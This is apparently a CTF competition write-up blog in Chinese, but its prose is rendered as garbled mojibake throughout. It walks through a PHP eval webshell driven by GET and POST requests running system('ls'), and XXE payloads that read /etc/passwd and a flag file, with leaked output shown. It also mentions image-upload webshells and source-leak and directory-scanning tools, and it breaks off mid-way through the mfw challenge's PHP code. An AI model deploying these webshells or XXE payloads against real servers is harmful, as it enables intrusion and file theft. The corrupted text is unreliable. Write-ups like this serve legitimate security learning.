<li><p><strong>$_post[â€˜cmdâ€™]</strong> : ä¸€å¥è¯çš„ç›®çš„æ˜¯æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤, é‚£ä¹ˆå®ƒå°±éœ€è¦ä¸€ä¸ªå˜é‡æ¥æ¥æ”¶æˆ‘ä»¬ä¼ æ¥çš„æ•°æ®, $_post[â€˜cmdâ€™]å°±æ˜¯å¹²è¿™ä¸ªçš„, å®ƒä¼šä»httpçš„POSTæ•°æ®åŒ…ä¸­æ¥æ”¶ä¸€ä¸ªåä¸º<code>cmd</code>çš„å‚æ•°.<br>é—®é¢˜æ˜¯, å¦‚æœè¿™ä¸ªä¸€å¥è¯æœ¨é©¬æ˜¯åˆ«äººæ¤å…¥çš„, é‚£æˆ‘å°±ä¸çŸ¥é“è¿™ä¸ªå‚æ•°çš„åå­—æ˜¯ä»€ä¹ˆ, ä¹Ÿå°±æ— æ³•æ­£ç¡®çš„<del>åšçˆ±åšçš„äº‹</del>ä¼ å‚. æ‰€ä»¥è¿™é‡Œçš„å‚æ•°ååˆèµ·åˆ°äº†å¯†ç çš„ä½œç”¨, è®©æˆ‘ä»¬çš„ä¸€å¥è¯åªä¸ºè‡ªå·±æ‰€ç”¨.</p>
</li>
<li><p><strong>@</strong> ç¬¦å·çš„ä½œç”¨æ˜¯ : å¦‚æœä»£ç é”™è¯¯æ‰§è¡Œ, ä¸æŠŠæŠ¥é”™ä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥.<br>ä¸ºä»€ä¹ˆè¦è¿™æ ·åšå‘¢? å› ä¸ºå‡å¦‚æˆ‘ä»¬ä¸ä¼ å‚æ•°æ‰§è¡Œä»£ç , é‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šå–„æ„çš„æŠ¥é”™:</p>
<blockquote>
<p>Noticeï¼Œä½ çš„cmdå˜é‡æ²¡æœ‰å®šä¹‰ã€‚</p>
</blockquote>
<p>äºæ˜¯å¯†ç å°±è¢«æœåŠ¡å™¨æš´éœ²äº†.<br>@ å°±å¯ä»¥é¿å…è¿™ç§å°´å°¬çš„åœºé¢</p>
</li>
</ul>
<p>å…¶å®æˆ‘è§‰å¾—ä¸Šæ¥å°±ç”¨èœåˆ€æ§åˆ¶ä¸€å¥è¯æœ¨é©¬å¹¶ä¸å¥½,<br>å› ä¸ºè¿™ä¸ªå·¥å…·æŠŠåº•å±‚çš„ä¸œè¥¿éƒ½å°è£…å¥½äº†.<br>æˆ‘æ·±ä¿¡, è¦æƒ³çœŸæ­£ç†è§£æŸæ ·ä¸œè¥¿, è¶Šæ¥è¿‘åº•å±‚, è¶Šæœ‰åŠ©äºæ·±å…¥.<br>æ‰€ä»¥è¦å…ˆå­¦ä¼š<strong>ä½¿ç”¨æµè§ˆå™¨è¿æ¥ä¸€å¥è¯æœ¨é©¬</strong></p>
<p>åœ¨æ¯”èµ›çš„æ—¶å€™, è§åˆ°å­¦é•¿åœ¨urlä¸Šè®¾ç½®payload,<br>æ‰€ä»¥æˆ‘æƒ³è®¾ç½®urlçš„payloadè¿æ¥ä¸€å¥è¯,<br><code>http://whoisyourdaddy.cf/test.php?cmd=system(&#39;ls&#39;);</code><br>æŒ‰ç…§æˆ‘ä»¬ä¸Šé¢çš„åˆ†æ, phpä»£ç å°±ä¼šæ‰§è¡Œ<code>system(&#39;ls&#39;);</code>, å›æ˜¾å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶.<br>(ä¸€å®šä¸è¦å¿˜è®°åé¢çš„ <code>;</code>è¡€çš„æ•™è®­ğŸ˜­)<br><font size="5"><strong>ç„¶è€Œ :</strong></font></p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/kongkongde.png" alt title class>
                <p></p>
            </figure>

<p>è¿™æ˜¯å› ä¸º, <strong>$_postæ ¹æœ¬ä¸æ¥æ”¶ç”¨GETæ–¹æ³•ä¼ æ¥çš„å‚æ•°!</strong><br>$_poståªæ¥æ”¶ä½¿ç”¨POSTæ–¹æ³•æ¥å—çš„è¡¨å•æ•°æ®.</p>
<p>ç®€å•èµ·è§, æˆ‘ä»¬å…ˆç”¨urlä½œä¸ºpayload, é‚£ä¹ˆ, éœ€è¦æŠŠä»£ç æ”¹æˆ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®ä¸€ä¸‹.</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/ls.png" alt title class>
                <p></p>
            </figure>
<p>æˆåŠŸäº†.</p>
<p>åŒç†, è¦æƒ³ä½¿ç”¨POSTæ–¹æ³•ä¼ é€’æ•°æ®, å¯ä»¥ç”¨</p>
<ul>
<li>Chrome çš„æ’ä»¶ Hackbar</li>
<li>Burp Suite change method</li>
<li>Post man ç”Ÿæˆ payload</li>
</ul>
<p>æˆ‘æˆåŠŸçš„ä½¿ç”¨Burp çš„ change method åŠŸèƒ½å’Œ PostMan å®ç°äº†.<br>postmançš„ä½¿ç”¨æœ‰äº›å‘è¦æ³¨æ„, å¦‚å›¾</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/postman.png" alt title class>
                <p></p>
            </figure>
<h4 id="POSTå’ŒGETæ•°æ®åŒ…çš„å¯¹æ¯”"><a href="#POSTå’ŒGETæ•°æ®åŒ…çš„å¯¹æ¯”" class="headerlink" title="POSTå’ŒGETæ•°æ®åŒ…çš„å¯¹æ¯”"></a>POSTå’ŒGETæ•°æ®åŒ…çš„å¯¹æ¯”</h4><p>GET:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /test.php?cmd=system(%27ls%27); HTTP/1.1</span><br><span class="line">Host: whoisyourdaddy.cf</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>POST:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php HTTP/1.1</span><br><span class="line">Host: whoisyourdaddy.cf</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 21</span><br><span class="line"></span><br><span class="line">cmd=system(%27ls%27);</span><br></pre></td></tr></table></figure>

<p>ä¸€å¥è¯æœ¨é©¬å…ˆåˆ†æåˆ°è¿™é‡Œ.</p>
<h4 id="å…¶ä»–æ¼æ´"><a href="#å…¶ä»–æ¼æ´" class="headerlink" title="å…¶ä»–æ¼æ´"></a>å…¶ä»–æ¼æ´</h4><p>ç”±äºçº¿ä¸‹èµ›çš„æœåŠ¡å™¨åœ¨æ¯”èµ›ç»“æŸåå°±å…³é—­äº†, å¾ˆå¤šé¢˜ç›®ä¹Ÿä¸æ–¹ä¾¿å¤ç°.<br>ä¸»è¦è¯´ä¸€ä¸‹æ€è·¯å°±å¥½äº†</p>
<ul>
<li>web1<br>å‰é¢çš„ä¸€å¥è¯æœ¨é©¬å·²ç»åˆ†æè¿‡äº†,<br>å…¶ä¿®è¡¥æ¼æ´çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å• : ç›´æ¥åˆ é™¤æœ¨é©¬æ–‡ä»¶, ä¸€äº†ç™¾äº†.<br>é™¤äº†ä¸Šé¢çš„ä¸€å¥è¯æ¼æ´, è¿˜æœ‰é’ˆå¯¹finecmsçš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´<br>æˆ‘è®¤ä¸ºè¿™ä¸ªæ¼æ´çš„æ ¹æºæ˜¯urlè¿‡æ»¤ä¸å¤Ÿä¸¥æ ¼<br>é¢˜ç›®ä¸€å¼€å§‹çš„ä»£ç åªæ›¿æ¢<code>../</code>ä¸º<code></code>,<br>ä¿®è¡¥æ–¹å¼æ˜¯, å¾ªç¯æ›¿æ¢<code>../</code>, è®©ä¸æ³•åˆ†å­æ— æœºå¯ä¹˜<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/welcome.png" alt="web1çš„logo,çœŸçš„å¾ˆçš®" title class>
                <p>web1çš„logo,çœŸçš„å¾ˆçš®</p>
            </figure>
<del>è¿™æ®µä»£ç , æˆ‘ä¿®çš„ (å‰è…°)</del></li>
<li>web2<br>åœ¨é¢˜ç›®ç»™çš„ç«™çš„æŸå¤„, å¯ä»¥ä¸Šä¼ å›¾ç‰‡,<br>ä½†æ˜¯å¯¹æ–‡ä»¶æ ¼å¼çš„æ£€æµ‹å´å¾ˆå®½æ¾.<br>ä¿å­˜ç€ä¸Šä¼ å›¾ç‰‡çš„åœ°æ–¹ä¹Ÿæ²¡æœ‰é™åˆ¶è®¿é—®.<br>ç›´æ¥å›¾ç‰‡é©¬èµ°èµ·å®‰æ’.<br>å¯ä»¥å‚è€ƒ <a href="http://whoisyourdaddy.cf/æ¸—é€æµ‹è¯•&ä¸Šä¼ æ¼æ´.html" target="_blank" rel="noopener">æ¸—é€æµ‹è¯•&amp;ä¸Šä¼ æ¼æ´</a></li>
<li>è‡³äºpwn1å’Œpwn2 , , , æ‰“æ‰°äº†æ‰“æ‰°äº†</li>
</ul>
<h3 id="apiè°ƒç”¨-resolved"><a href="#apiè°ƒç”¨-resolved" class="headerlink" title="apiè°ƒç”¨(resolved)"></a><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">apiè°ƒç”¨</a>(resolved)</h3><p>è¿™é“é¢˜åˆ©ç”¨çš„æ˜¯xxeæ¼æ´<br>é‚£ä¹ˆ<a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">ä»€ä¹ˆæ˜¯xxeæ¼æ´å‘¢?</a></p>
<blockquote>
<p>ç®€å•æ¥è¯´ï¼ŒXXEå°±æ˜¯XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚å½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå°±å¯èƒ½å¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ¢æµ‹ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚</p>
</blockquote>
<p><font size="2">å’³, è¿™è¯´çš„ä¸€ç‚¹ä¹Ÿä¸ç®€å•å•Š(å°å£°bb) </font><br>å¯¹ç€å…¶ä¸­å‡ ä¸ªé™Œç”Ÿçš„åè¯æ¥å­¦ä¹ ä¸‹:</p>
<ul>
<li><p>XML : </p>
<blockquote>
<p>å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼Œæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„å­é›†ï¼Œæ˜¯ä¸€ç§ç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ã€‚</p>
</blockquote>
<p>  æ ¹æ®æˆ‘è‡ªå·±çš„ç†è§£, åº”è¯¥å°±æ˜¯ä¸€ç§å¯ä»¥<strong>æ–¹ä¾¿è®¡ç®—æœºç†è§£</strong>çš„, ä½¿<strong>å†…éƒ¨æ•°æ®å…·æœ‰æ¸…æ™°é€»è¾‘ç»“æ„</strong>çš„ä¸€ç§<strong>æ ‡è®°è¯­è¨€</strong><br>  ç¤ºä¾‹ä»£ç å¦‚ä¸‹: </p>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line">Cookie: mycookie=cookies;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">"test101"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>XML is the best!<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>è¯­æ³•ä¸Š:<br>è¿™æ®µä»£ç ä¸­å®šä¹‰äº†ä¸€ä¸ªæ ¹å…ƒç´ â€“<code>catalog</code>, <code>id</code>æ˜¯<code>core</code>çš„ä¸€ä¸ªå±æ€§, <code>author</code>å’Œ<code>title</code>åˆ™æ˜¯<code>core</code>çš„å­å…ƒç´ , <code>core</code>æ˜¯<code>catalog</code>çš„å­å…ƒç´ </p>
</li>
<li><p>åŠŸèƒ½ä¸Š:<br>æ³¨æ„çœ‹ä»£ç çš„å¼€å¤´éƒ¨åˆ†, æ˜¯POSTæ–¹æ³•çš„<strong>Header</strong>. æ‰€ä»¥å…¶å®è¿™æ®µä»£ç æœ¬è´¨ä¸Šä»ç„¶æ˜¯ä¸€ä¸ª<strong>POSTæ–¹æ³•çš„httpæ•°æ®åŒ…</strong>, æœ¬è´¨ä¸Šå’Œæˆ‘ä»¬ä¹‹å‰åˆ†æçš„post|getæ•°æ®åŒ…æ²¡åŒºåˆ«. å…¶ä½œç”¨æ— éæ˜¯å‘æœåŠ¡å™¨æäº¤ä¸€ä»½æ•°æ®è€Œå·². è‡³äºæ€ä¹ˆå¤„ç†, é‚£å°±çœ‹æœåŠ¡ç«¯çš„ç¨‹åºæ˜¯æ€æ ·çš„äº†</p>
<br>  </li>
</ul>
</li>
<li><p><strong>å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“</strong> :<br>  ä¸è¿‡, å¦‚æœæ˜¯ä¸‹é¢çš„è¿™æ®µä»£ç , å°±ä¼šæˆä¸ºæ‰€è°“çš„æ¶æ„payload, å¦‚ä¸‹:</p>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">"test101"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>  è¿™æ®µä»£ç ä¸ä¸Šé¢çš„åªæœ‰ä¸¤è¡Œä¸ä¸€æ ·</p>
<ul>
<li><p><code>&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</code></p>
</li>
<li><p><code>&lt;description&gt;&amp;xxe;&lt;/description&gt;</code><br>å…¶ä¸­<code>&amp;xxe</code>å°±æ˜¯æ¶æ„å¼•ç”¨äº†å¤–éƒ¨çš„æ–‡ä»¶(å®ä½“):<code>file:///etc/passwd</code></p>
<br>
è¿™ä»½æ•°æ®åŒ…å¦‚æœå‘é€ç»™æœåŠ¡å™¨, ä»£ç è¢«è§£é‡Šå¹¶è¿”å›

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;no results for description root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync...&#125;</span><br></pre></td></tr></table></figure>

<p>â€œæ— æ„â€ä¸­å°±æŠŠæ–‡ä»¶çš„å†…å®¹æ³„æ¼å‡ºæ¥äº†.</p>
<br>
ä»¥ä¸Šå°±æ˜¯é€šè¿‡ç›´æ¥DTDå¤–éƒ¨å®ä½“å£°æ˜å®ç°çš„xxe. ç†è®ºä¸Šå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–.

<p>ä¸è¿‡è¿™ä¸€åˆ‡çš„å‰ææ˜¯, <strong>å…è®¸å¯¹å¤–éƒ¨å®ä½“çš„å¼•ç”¨</strong></p>
</li>
</ul>
</li>
</ul>
<p>å¥½çš„, å‰æœŸçŸ¥è¯†åŸºç¡€çš„é“ºå«å°±å…ˆè¿™ä¹ˆå¤š.<br>å›åˆ°åˆšæ‰çš„é¢˜ç›®ä¸Šæ¥, æˆ‘ä»¬æŸ¥çœ‹ä¸‹index.phpçš„æºä»£ç , æœ‰è¿™ä¹ˆä¸€æ®µ js ä»£ç </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr;</span><br><span class="line">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> xhr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"> <span class="keyword">var</span> xhr = XHR();</span><br><span class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line">             tip_area.value = data.task.search+data.task.value;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>emmm, è¿™æ®µä»£ç æœ‰å¤ªå¤šæˆ‘é™Œç”Ÿçš„æ–¹æ³•äº†(ä¸»è¦æ˜¯å› ä¸ºæ²¡å­¦è¿‡js), å…¨é¢çš„ç†è§£å¯¹è§£é¢˜æ¥è¯´æ€§ä»·æ¯”å¤ªä½äº†.<br>ä¸è¿‡å¦‚æœèƒ½æ•æ‰åˆ°å…¶ä¸­çš„å…³é”®å­—<code>XML</code>æˆ‘æƒ³å¯¹è§£é¢˜åº”è¯¥èƒ½èµ·åˆ°ä¸€ä¸ªå¾ˆå¥½çš„æç¤ºä½œç”¨å§.<br>æ€»ä¹‹, å‡è®¾æˆ‘ä»¬ç°åœ¨å·²ç»çŸ¥é“è¿™é“é¢˜ç›®æ˜¯æœ‰xxeæ¼æ´çš„, é‚£ä¹ˆå°±å¯ä»¥ç”¨åˆšæ‰çš„æ–¹æ³•è¯»å–flagæ–‡ä»¶!<br><br><br>ç‚¹å‡»é¢˜ç›®çš„é‚£ä¸ª<code>GO</code><br>ç”¨<code>Burp Suite</code>æŠ“åŒ…. å‘ç°æ˜¯<code>POST</code>æ–¹æ³•, bodyä¸­æœ‰ä¸€æ®µjsonæ ¼å¼çš„ä»£ç . å¼ƒä¹‹.<br>æˆ‘ä»¬è¦ä¼ xmlçš„æ•°æ®.<br>æ‰€ä»¥é¦–å…ˆæŠŠ<code>Content-Type</code>æ”¹æˆ<code>application/xml</code><br>å†åœ¨<code>body</code>ä¸­æ„é€ å¦‚ä¸‹payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE abcd[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY any SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">something</span>&gt;</span>&amp;any;<span class="tag">&lt;/<span class="name">something</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆæ•ˆæœå›¾ :</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/xxe.png" alt title class>
                <p></p>
            </figure>
<p>ojbk.</p>
<p>###<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5002" target="_blank" rel="noopener">mfw</a>(resolved)</p>
<p>åœ¨é¢˜ç›®ä¸­çœ‹åˆ°äº†å‡ºé¢˜è€…ä½¿ç”¨äº†Git, å¯ä»¥çŒœæµ‹æ˜¯Source Leak, ä½¿ç”¨GitHackè„šæœ¬, èƒ½ä¸‹è½½éƒ¨åˆ†æºä»£ç .</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/GitHack.png" alt title class>
                <p></p>
            </figure>

<p>å…¶å®ä¸€å¼€å§‹ä»¥ä¸ºè¦ç”¨ç›®å½•æ‰«æå·¥å…·, é¡ºä¾¿è®°å½•ä¸‹ç›®å½•æ‰«æçš„æ–¹æ³•, å¯ä»¥ç”¨Kaliè‡ªå¸¦çš„<code>dirbuster</code>, ä¹Ÿå¯ä»¥ç”¨Githubä¸Šçš„å¼€æºå·¥å…·<code>dirsearch</code>.<br>è¿™é‡Œæ¨èç”¨åè€…, å› ä¸ºå®ƒç®€å•æ˜“ç”¨ä¸”ååˆ†å¼ºå¤§.<br><strong>ä½¿ç”¨æ–¹æ³•</strong> : <code>python dirsearch.py -u [URL] -e *</code></p>
<p>è¨€å½’æ­£ä¼ <br>åœ¨ä¸‹è½½ä¸‹çš„ç›®å½•ä¸­çœ‹åˆ°æœ‰ä¸ª<code>\templates\flag.php</code>, è¿›å»åå†™ç€TODO, è¿™å…¶å®ç»™äº†æˆ‘ä»¬æç¤º, <strong>è¦æƒ³åŠæ³•è¯»å–è¿™ä¸ªflag.php</strong>.</p>
<p>å†æ¥å®¡è®¡index.phpçš„ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span 